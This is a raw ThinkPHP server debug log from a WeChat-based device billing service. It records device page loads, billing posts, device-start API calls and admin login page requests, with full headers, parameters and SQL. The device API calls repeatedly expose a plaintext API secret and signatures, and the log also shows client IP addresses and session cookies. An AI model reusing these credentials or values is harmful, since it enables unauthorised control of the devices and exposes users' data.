[ sql ] [ DB ] CONNECT:[ UseTime:0.000450s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001359s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000358s ]
---------------------------------------------------------------
[2019-06-04T14:54:12+08:00] 115.171.245.110 POST csgxjk.com/wx/device/bill.html
[运行时间：0.065233s] [吞吐率：15.33req/s] [内存消耗：3,689.44kb] [文件加载：134]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/bill',
  'route' => 'wxapi/device/bill',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'referer' => 'http://csgxjk.com/wx/device/work/4',
  'origin' => 'http://csgxjk.com',
  'host' => 'csgxjk.com',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'content-length' => '14',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
  'did' => '4',
  'mealid' => '2',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000485s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001373s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000332s ]
---------------------------------------------------------------
[2019-06-04T14:54:33+08:00] 115.171.245.110 GET csgxjk.com/wx/device/work/4
[运行时间：0.035714s] [吞吐率：28.00req/s] [内存消耗：3,849.44kb] [文件加载：140]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/work/<id>',
  'route' => 'wxapi/device/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
    'id' => '4',
  ),
)
[ info ] [ HEADER ] array (
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'upgrade-insecure-requests' => '1',
  'host' => 'csgxjk.com',
  'cookie' => 'thinkphp_show_page_trace=0|0',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/wxpic,image/sharpp,image/apng,image/tpg,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '4',
)
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /data/www/csgx2/application/wxapi/view/device_work.php [ array (
  0 => 'dev',
  1 => 'setmeal',
) ]
[ sql ] [ DB ] CONNECT:[ UseTime:0.000510s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001417s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000356s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001061s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` IN (1,2,3) [ RunTime:0.000343s ]
---------------------------------------------------------------
[2019-06-04T14:54:34+08:00] 39.96.87.22 POST csgxjk.com/api/device/100/work
[运行时间：0.025996s] [吞吐率：38.47req/s] [内存消耗：3,251.53kb] [文件加载：86]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/device/100/work',
  'route' => 'api/api100/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '122',
  'accept' => '*/*',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
)
[ info ] [ PARAM ] array (
  'appid' => '1',
  'secret' => 'csgx@xt@eUmkdL#2H',
  'timestamp' => '1559631274',
  'devid' => '4',
  'command' => 'start',
  'long' => '600',
  'sign' => '64aec8e028d741335c41f381d800f98e',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000378s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001213s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000352s ]
---------------------------------------------------------------
[2019-06-04T14:54:34+08:00] 115.171.245.110 POST csgxjk.com/wx/device/bill.html
[运行时间：0.063804s] [吞吐率：15.67req/s] [内存消耗：3,689.44kb] [文件加载：134]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/bill',
  'route' => 'wxapi/device/bill',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'referer' => 'http://csgxjk.com/wx/device/work/4',
  'origin' => 'http://csgxjk.com',
  'host' => 'csgxjk.com',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'content-length' => '14',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
  'did' => '4',
  'mealid' => '2',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000456s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001344s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000340s ]
---------------------------------------------------------------
[2019-06-04T14:54:37+08:00] 39.96.87.22 POST csgxjk.com/api/device/100/work
[运行时间：0.026470s] [吞吐率：37.78req/s] [内存消耗：3,251.53kb] [文件加载：86]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/device/100/work',
  'route' => 'api/api100/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '122',
  'accept' => '*/*',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
)
[ info ] [ PARAM ] array (
  'appid' => '1',
  'secret' => 'csgx@xt@eUmkdL#2H',
  'timestamp' => '1559631277',
  'devid' => '4',
  'command' => 'start',
  'long' => '600',
  'sign' => '9017ca1f4a912eb146851a26e1c603e7',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000422s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001323s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000341s ]
---------------------------------------------------------------
[2019-06-04T14:54:37+08:00] 115.171.245.110 POST csgxjk.com/wx/device/bill.html
[运行时间：0.064476s] [吞吐率：15.51req/s] [内存消耗：3,689.44kb] [文件加载：134]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/bill',
  'route' => 'wxapi/device/bill',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'referer' => 'http://csgxjk.com/wx/device/work/4',
  'origin' => 'http://csgxjk.com',
  'host' => 'csgxjk.com',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'content-length' => '14',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
  'did' => '4',
  'mealid' => '2',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000485s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001351s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000356s ]
---------------------------------------------------------------
[2019-06-04T14:54:39+08:00] 39.96.87.22 POST csgxjk.com/api/device/100/work
[运行时间：0.025835s] [吞吐率：38.71req/s] [内存消耗：3,251.53kb] [文件加载：86]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/device/100/work',
  'route' => 'api/api100/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '122',
  'accept' => '*/*',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
)
[ info ] [ PARAM ] array (
  'appid' => '1',
  'secret' => 'csgx@xt@eUmkdL#2H',
  'timestamp' => '1559631279',
  'devid' => '4',
  'command' => 'start',
  'long' => '600',
  'sign' => 'fb72d18e06950a4b6d4b9fc0be3e6e85',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000377s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001255s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000345s ]
---------------------------------------------------------------
[2019-06-04T14:54:39+08:00] 115.171.245.110 POST csgxjk.com/wx/device/bill.html
[运行时间：0.063302s] [吞吐率：15.80req/s] [内存消耗：3,689.44kb] [文件加载：134]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/bill',
  'route' => 'wxapi/device/bill',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'x-forwarded-for-pound' => '115.171.245.110',
  'x-forwarded-for' => '115.171.245.110',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 7.1.1; OPPO R11 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044704 Mobile Safari/537.36 MMWEBID/9384 MicroMessenger/7.0.4.1420(0x2700043B) Process/tools NetType/WIFI Language/zh_CN',
  'referer' => 'http://csgxjk.com/wx/device/work/4',
  'origin' => 'http://csgxjk.com',
  'host' => 'csgxjk.com',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'content-length' => '14',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.9',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
  'did' => '4',
  'mealid' => '2',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000472s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001344s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000334s ]
---------------------------------------------------------------
[2019-06-04T14:54:46+08:00] 223.104.3.25 GET csgxjk.com/wx/device/work/4
[运行时间：0.034772s] [吞吐率：28.76req/s] [内存消耗：3,848.32kb] [文件加载：140]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/work/<id>',
  'route' => 'wxapi/device/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
    'id' => '4',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-cn',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 MicroMessenger/7.0.4(0x17000428) NetType/4G Language/zh_CN',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'upgrade-insecure-requests' => '1',
  'host' => 'csgxjk.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '4',
)
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /data/www/csgx2/application/wxapi/view/device_work.php [ array (
  0 => 'dev',
  1 => 'setmeal',
) ]
[ sql ] [ DB ] CONNECT:[ UseTime:0.000511s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001382s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000371s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001026s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` IN (1,2,3) [ RunTime:0.000322s ]
---------------------------------------------------------------
[2019-06-04T14:54:57+08:00] 39.96.87.22 POST csgxjk.com/api/device/100/work
[运行时间：0.039652s] [吞吐率：25.22req/s] [内存消耗：3,229.11kb] [文件加载：87]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/device/100/work',
  'route' => 'api/api100/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '122',
  'accept' => '*/*',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 MicroMessenger/7.0.4(0x17000428) NetType/4G Language/zh_CN',
)
[ info ] [ PARAM ] array (
  'appid' => '1',
  'secret' => 'csgx@xt@eUmkdL#2H',
  'timestamp' => '1559631297',
  'devid' => '4',
  'command' => 'start',
  'long' => '300',
  'sign' => '55e70d02dd896076b0ae3bd63523301a',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000483s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001391s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000389s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `record_api` [ RunTime:0.001036s ]
[ sql ] [ SQL ] INSERT INTO `record_api` (`appid` , `devid` , `start_time` , `long`) VALUES (1 , 4 , 1559631297 , 300) [ RunTime:0.000317s ]
---------------------------------------------------------------
[2019-06-04T14:54:57+08:00] 223.104.3.25 POST csgxjk.com/wx/device/bill.html
[运行时间：0.077780s] [吞吐率：12.86req/s] [内存消耗：3,703.88kb] [文件加载：135]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/bill',
  'route' => 'wxapi/device/bill',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'content-length' => '14',
  'referer' => 'http://csgxjk.com/wx/device/work/4',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A366 MicroMessenger/7.0.4(0x17000428) NetType/4G Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-cn',
  'origin' => 'http://csgxjk.com',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'host' => 'csgxjk.com',
)
[ info ] [ PARAM ] array (
  'did' => '4',
  'mealid' => '1',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000507s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001348s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` = 1 LIMIT 1 [ RunTime:0.000346s ]
---------------------------------------------------------------
[2019-06-04T14:55:41+08:00] 106.120.98.190 GET csgxjk.com/wx/device/work/4
[运行时间：0.035125s] [吞吐率：28.47req/s] [内存消耗：3,848.32kb] [文件加载：140]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/work/<id>',
  'route' => 'wxapi/device/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
    'id' => '4',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-cn',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/7.0.4(0x17000428) NetType/WIFI Language/zh_CN',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'upgrade-insecure-requests' => '1',
  'host' => 'csgxjk.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '4',
)
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /data/www/csgx2/application/wxapi/view/device_work.php [ array (
  0 => 'dev',
  1 => 'setmeal',
) ]
[ sql ] [ DB ] CONNECT:[ UseTime:0.000507s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001413s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000362s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001026s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` IN (1,2,3) [ RunTime:0.000337s ]
---------------------------------------------------------------
[2019-06-04T14:55:54+08:00] 39.96.87.22 POST csgxjk.com/api/device/100/work
[运行时间：0.025946s] [吞吐率：38.54req/s] [内存消耗：3,251.16kb] [文件加载：86]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'api/device/100/work',
  'route' => 'api/api100/work',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '122',
  'accept' => '*/*',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/7.0.4(0x17000428) NetType/WIFI Language/zh_CN',
)
[ info ] [ PARAM ] array (
  'appid' => '1',
  'secret' => 'csgx@xt@eUmkdL#2H',
  'timestamp' => '1559631354',
  'devid' => '4',
  'command' => 'start',
  'long' => '600',
  'sign' => 'f82ee2bfc37d00cbbb1bb98255042de9',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000385s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `bg_device` [ RunTime:0.001270s ]
[ sql ] [ SQL ] SELECT * FROM `bg_device` WHERE  `id` = 4 LIMIT 1 [ RunTime:0.000349s ]
---------------------------------------------------------------
[2019-06-04T14:55:54+08:00] 106.120.98.190 POST csgxjk.com/wx/device/bill.html
[运行时间：0.063921s] [吞吐率：15.64req/s] [内存消耗：3,688.60kb] [文件加载：134]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'rule' => 'wx/device/bill',
  'route' => 'wxapi/device/bill',
  'option' => 
  array (
    'merge_rule_regex' => false,
  ),
  'var' => 
  array (
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'content-length' => '14',
  'referer' => 'http://csgxjk.com/wx/device/work/4',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/7.0.4(0x17000428) NetType/WIFI Language/zh_CN',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-cn',
  'origin' => 'http://csgxjk.com',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'host' => 'csgxjk.com',
)
[ info ] [ PARAM ] array (
  'did' => '4',
  'mealid' => '2',
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000463s ] mysql:host=127.0.0.1;port=3306;dbname=liangzi;charset=utf8mb4
[ sql ] [ SQL ] SHOW COLUMNS FROM `h_meal` [ RunTime:0.001362s ]
[ sql ] [ SQL ] SELECT * FROM `h_meal` WHERE  `id` = 2 LIMIT 1 [ RunTime:0.000345s ]
---------------------------------------------------------------
[2019-06-04T15:10:38+08:00] 222.161.245.30 GET csgxjk.com/admin/index/index.html
[运行时间：0.019730s] [吞吐率：50.68req/s] [内存消耗：2,160.24kb] [文件加载：84]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'host' => 'csgxjk.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/index_index.php [ array (
  0 => 'userinfo',
  1 => 'menu',
) ]
---------------------------------------------------------------
[2019-06-04T15:10:38+08:00] 222.161.245.30 GET csgxjk.com/admin/dashboard/welcome.html
[运行时间：0.017864s] [吞吐率：55.98req/s] [内存消耗：2,155.83kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cookie' => 'ASPSESSIONID=t3ar4vrcdjfvjhim77m7ji8mhi',
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://csgxjk.com/admin/index/index.html',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'host' => 'csgxjk.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-06-04T15:10:38+08:00] 222.161.245.30 GET csgxjk.com/admin/login/
[运行时间：0.018499s] [吞吐率：54.06req/s] [内存消耗：2,154.06kb] [文件加载：83]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cookie' => 'ASPSESSIONID=t3ar4vrcdjfvjhim77m7ji8mhi',
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://csgxjk.com/admin/index/index.html',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'host' => 'csgxjk.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-06-04T15:10:38+08:00] 222.161.245.30 GET csgxjk.com/admin/login/
[运行时间：0.019690s] [吞吐率：50.79req/s] [内存消耗：2,153.94kb] [文件加载：83]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cookie' => 'ASPSESSIONID=t3ar4vrcdjfvjhim77m7ji8mhi',
  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'http://csgxjk.com/admin/login/',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'host' => 'csgxjk.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
